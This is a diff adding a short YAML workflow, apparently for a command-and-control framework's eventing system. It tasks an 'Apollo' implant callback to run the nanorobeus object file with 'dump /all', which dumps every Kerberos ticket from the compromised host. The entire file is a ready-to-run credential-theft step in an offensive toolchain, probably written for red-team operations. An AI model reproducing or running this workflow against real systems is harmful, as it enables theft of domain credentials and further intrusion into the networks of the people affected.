@@ -1,0 +1,28 @@
+name: "Credential Dumping - Apollo"
+description: "Active credential dumping via nanorobeus"
+trigger: manual
+trigger_data:
+  payload_types:
+    - apollo
+keywords:
+  - apollo_callback
+environment: {}
+
+#uses: https://github.com/sliverarmory/armory/
+
+steps:
+
+  - name: "List Tickets"
+    continue_on_error: true
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create    
+    action_data:
+      callback_display_id: CALLBACK_ID
+      params: '{
+        "coff_name": "nanorobeus.x64.o",
+        "function": "go",
+		"coff_arguments": [["z","dump"],["z","/all"],["z",""],["z",""],["z",""]],
+        "serialized_arguments": "00000000"
+      }'
+      command_name: execute_coff
